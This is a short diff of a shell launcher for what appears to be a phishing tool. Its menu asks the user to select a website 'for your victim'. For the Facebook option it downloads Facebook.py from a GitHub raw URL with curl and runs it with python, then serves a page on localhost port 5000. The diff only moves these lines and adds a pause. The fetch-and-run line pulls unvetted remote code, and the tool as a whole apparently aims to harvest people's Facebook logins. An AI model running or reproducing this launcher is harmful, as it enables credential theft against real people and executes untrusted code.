@@ -70,14 +70,17 @@ echo ""
 read -p "$(echo -e ${CYAN} Select Website For Your Victim: ${NC} )" choice
 
 if [ "$choice" == "1" ]; then
-  curl -L -o Facebook.py https://raw.githubusercontent.com/Surajdas007272/Spider/main/Facebook.py
-  python Facebook.py
-
-  
   echo -e ${CYAN}" ctrl + c For Exit" ${NC}
 
   echo -e ${CYAN} " http://127.0.0.1:5000 " ${NC}
 
+  sleep 2
+  
+  curl -L -o Facebook.py https://raw.githubusercontent.com/Surajdas007272/Spider/main/Facebook.py
+  python Facebook.py
+
+  
+  
 elif [ "$choice" == "0" ]; then
   echo "Good Bye"
   sleep 2
